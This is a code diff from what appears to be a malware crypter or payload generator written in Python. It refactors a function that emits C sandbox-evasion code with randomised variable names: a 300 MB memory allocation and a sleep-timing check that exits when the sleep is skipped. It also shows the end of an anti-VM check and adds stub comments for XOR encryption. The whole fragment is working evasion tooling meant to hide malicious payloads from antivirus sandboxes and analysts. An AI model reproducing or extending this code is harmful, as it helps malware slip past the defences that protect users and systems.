@@ -21,29 +21,22 @@ def Decoil():
     Number_Of_Decoil = 0
     Decoil_Code = ""
 
-    Decoil_while = True
+    while Number_Of_Decoil != Transform_To_Int:
 
-    while Decoil_while:
+        Number_Of_Decoil += 1
+        Memdmp1 = gen.Varname_Creator()
+        Tac1 = gen.Varname_Creator()
+        Tick1 = gen.Varname_Creator()
 
-        if Number_Of_Decoil != Transform_To_Int:
-
-            Number_Of_Decoil += 1
-            Memdmp1 = gen.Varname_Creator()
-            Tac1 = gen.Varname_Creator()
-            Tick1 = gen.Varname_Creator()
-
-            Decoil_Code += "char * " + Memdmp1 + "= NULL;"
-            Decoil_Code += Memdmp1 + " = (char *)malloc(300000000);"
-            Decoil_Code += "if (" + Memdmp1 + " != NULL) {"
-            Decoil_Code += "memset(" + Memdmp1 + ", 00, 300000000);}"
-            Decoil_Code += "int " + Tick1 + " = GetTickCount();"
-            Decoil_Code += "Sleep(1000);"
-            Decoil_Code += "int " + Tac1 + " = GetTickCount();"
-            Decoil_Code += "if ((" + Tac1 + " - " + Tick1 + ") < 1000) {exit(0);}"
-            Decoil_Code += "free(" + Memdmp1 + ");"
-
-        elif Number_Of_Decoil == Transform_To_Int:
-            Decoil_while = False
+        Decoil_Code += "char * " + Memdmp1 + "= NULL;"
+        Decoil_Code += Memdmp1 + " = (char *)malloc(300000000);"
+        Decoil_Code += "if (" + Memdmp1 + " != NULL) {"
+        Decoil_Code += "memset(" + Memdmp1 + ", 00, 300000000);}"
+        Decoil_Code += "int " + Tick1 + " = GetTickCount();"
+        Decoil_Code += "Sleep(1000);"
+        Decoil_Code += "int " + Tac1 + " = GetTickCount();"
+        Decoil_Code += "if ((" + Tac1 + " - " + Tick1 + ") < 1000) {exit(0);}"
+        Decoil_Code += "free(" + Memdmp1 + ");"
 
     return Decoil_Code
 
@@ -88,3 +81,11 @@ def Anti_VM(FILENAME):
     AntiVM += "else exit(0);"
 
     return AntiVM
+
+
+
+#def Xor_Encryption:
+
+
+
+#def Xor_Decryption():
